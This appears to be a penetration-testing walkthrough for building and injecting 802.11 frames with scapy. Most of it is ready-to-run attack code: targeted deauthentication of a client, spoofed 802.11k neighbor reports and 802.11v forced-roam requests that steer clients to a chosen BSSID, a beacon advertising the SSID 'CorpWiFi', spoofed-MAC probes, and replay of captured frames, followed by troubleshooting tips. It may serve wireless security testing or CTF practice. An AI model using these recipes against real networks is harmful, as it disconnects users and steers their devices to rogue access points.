# scapy 802.11 — walkthrough

**Verified against:** scapy 2.5 as of 2026-Q3

When no other tool emits the frame you need. Every recipe below
assumes a monitor+injection interface (`wlan1mon`) and Python 3
with scapy installed.

## Preconditions

```
pip install scapy
sudo ip link set wlan1 down
sudo iw dev wlan1 set type monitor
sudo ip link set wlan1 up
```

## Recipe A — Custom beacon (with vendor-IE stego)

```python
from scapy.all import *

# Beacon with an SSID plus a fake vendor IE carrying flag bytes.
frame = (
    RadioTap()
    / Dot11(type=0, subtype=8,
            addr1="ff:ff:ff:ff:ff:ff",
            addr2="aa:bb:cc:dd:ee:ff",
            addr3="aa:bb:cc:dd:ee:ff")
    / Dot11Beacon(cap="ESS+privacy")
    / Dot11Elt(ID=0, info=b"CorpWiFi")       # SSID
    / Dot11Elt(ID=1, info=b"\x82\x84\x8b\x96")  # supported rates
    / Dot11Elt(ID=3, info=bytes([6]))         # DS Parameter Set (channel 6)
    / Dot11Elt(ID=221, info=(                  # Vendor-Specific IE
        b"\x00\x50\xf2\x08"                    # Microsoft OUI + subtype
        b"flag{stego-in-beacon}"                # payload
    ))
)

# Send at ~10 Hz for a minute:
sendp(frame, iface="wlan1mon", inter=0.1, count=600)
```

## Recipe B — Targeted deauth (fine control)

```python
frame = RadioTap() / Dot11(
    type=0, subtype=12,
    addr1="11:22:33:44:55:66",   # target STA
    addr2="AA:BB:CC:DD:EE:FF",   # spoofed AP
    addr3="AA:BB:CC:DD:EE:FF",   # BSSID
) / Dot11Deauth(reason=7)

sendp(frame, iface="wlan1mon", count=5, inter=0.1)
```

## Recipe C — ANQP GAS Initial Request

Pre-association Hotspot 2.0 query.

```python
ANQP_QUERY = bytes([
    0x04,                     # Public Action
    0x0a,                     # GAS Initial Request
    0x01,                     # Dialog Token
    0x6c, 0x02, 0x7f, 0x00,   # Advertisement Protocol IE (ANQP)
    0x0a, 0x00,               # Query Length
    0x00, 0x01, 0x06, 0x00,   # ANQP Query List
    0x01, 0x01,               # 257 Venue Name
    0x03, 0x01,               # 259 Roaming Consortium
    0x05, 0x01,               # 261 NAI Realm
])

frame = RadioTap() / Dot11(
    type=0, subtype=13,
    addr1="AA:BB:CC:DD:EE:FF",
    addr2="66:55:44:33:22:11",   # your MAC
    addr3="AA:BB:CC:DD:EE:FF",
) / Raw(load=ANQP_QUERY)

sendp(frame, iface="wlan1mon")
```

## Recipe D — Neighbor Report Response spoof (802.11k)

Redirect a roaming client toward a specific BSSID.

```python
neighbor_report_ie = bytes.fromhex(
    "34"           # IE 52 (Neighbor Report)
    "0d"           # length 13
    "aabbccddeeff" # neighbor BSSID
    "00000000"     # BSSID Information
    "51"           # Operating Class 81 (2.4 GHz)
    "06"           # Channel 6
    "00"           # PHY Type
)

frame = RadioTap() / Dot11(
    type=0, subtype=13,
    addr1="11:22:33:44:55:66",
    addr2="AA:BB:CC:DD:EE:FF",
    addr3="AA:BB:CC:DD:EE:FF",
) / Raw(load=bytes([0x05, 0x05, 0x01]) + neighbor_report_ie)

sendp(frame, iface="wlan1mon")
```

## Recipe E — BTM (802.11v) forced-roam Request

```python
btm_ie = bytes.fromhex(
    "0a"        # Category: WNM
    "07"        # Action: BSS Transition Management Request
    "01"        # Dialog Token
    "0e"        # Request Mode (disassociation-imminent bit)
    "6400"      # Disassoc Timer (100 TU)
    "00"        # Validity Interval
    # Optional Neighbor Report IE follows...
)

frame = RadioTap() / Dot11(
    type=0, subtype=13,
    addr1="11:22:33:44:55:66",
    addr2="AA:BB:CC:DD:EE:FF",
    addr3="AA:BB:CC:DD:EE:FF",
) / Raw(load=btm_ie)

sendp(frame, iface="wlan1mon")
```

## Recipe F — Probe request with a spoofed source MAC

For karma-testing (does this AP probe-respond to any SSID?).

```python
for ssid_probe in ["Impossible-Test-1", "attwifi", "gibberish"]:
    frame = RadioTap() / Dot11(
        type=0, subtype=4,
        addr1="ff:ff:ff:ff:ff:ff",
        addr2="66:55:44:33:22:11",
        addr3="ff:ff:ff:ff:ff:ff",
    ) / Dot11ProbeReq() / Dot11Elt(ID=0, info=ssid_probe.encode())
    sendp(frame, iface="wlan1mon")
```

Watch for probe responses from a KARMA-family rogue.

## Recipe G — Assemble arbitrary raw frames

```python
# Full raw frame from hex — when you have a captured target frame
# from Wireshark and want to replay/modify.
raw = bytes.fromhex(
    "8802"      # Frame Control: data, subtype 8 (QoS)
    "0000"      # Duration
    "aabbccddeeff"   # Address 1
    "112233445566"   # Address 2
    "aabbccddeeff"   # Address 3
    "0000"           # Sequence
    "0000"           # QoS Control
)

sendp(RadioTap()/Raw(load=raw), iface="wlan1mon")
```

## Failure modes

- **`sendp` says "Errno 100 Network is down".** iface isn't monitor
  or is `ip link set down`. Bring it up.
- **Frames sent but nothing responds.** Wrong channel. `iw dev
  wlan1mon set channel 6`.
- **Injection returns "Operation not supported".** Driver doesn't
  support injection (Intel iwlwifi on many revs). Use ath9k / mt76.
- **Frame malformed on the wire.** RadioTap header missing or in
  wrong order. Always `RadioTap()` first.
- **Rate too high, kernel drops.** `inter=0.001` might be silently
  discarded. Use `inter=0.01` minimum on ath9k.

## Cite

- scapy.readthedocs.io — Dot11* class tree.
- IEEE Std 802.11-2020, §9.3 (frame formats).
- attacks.json: `deauth-targeted`, `beacon-stego-vendor-ie`,
  `anqp-realm-enum`, `neighbor-report-spoof`, `btm-forced-roam`,
  `packet-inject-arbitrary`.
